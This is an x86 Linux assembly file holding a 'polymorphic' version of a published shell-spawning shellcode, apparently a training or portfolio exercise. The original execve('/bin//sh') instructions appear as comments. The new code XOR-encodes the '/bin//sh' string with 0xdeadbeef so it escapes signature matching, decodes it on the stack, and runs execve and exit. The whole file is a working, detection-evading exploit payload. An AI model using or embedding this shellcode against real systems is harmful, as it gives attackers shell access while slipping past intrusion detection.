; Original: http://shell-storm.org/shellcode/files/shellcode-811.php
; Polymorphic version by: Tristan aka R3OATH
; Website: www.r3oath.com

global _start

section .text
_start:

	; Original
	;xor eax,eax
	;push eax
	;push dword 0x68732f2f
	;push dword 0x6e69622f
	;mov ebx,esp
	;mov ecx,eax
	;mov edx,eax
	;mov al,0xb
	;int 0x80
	;xor eax,eax
	;inc eax
	;int 0x80

	; Polymorphic Shellcode
	xor ecx, ecx
	mul ecx
	push ecx
	mov esi, 0xdeadbeef
	push 0xb6de91c0
	push 0xb0c4dcc0
	xor [esp], esi
	xor [esp +4], esi
	mov ebx, esp
	mov al, 0xb
	int 0x80
	sub al, 0xa
	int 0x80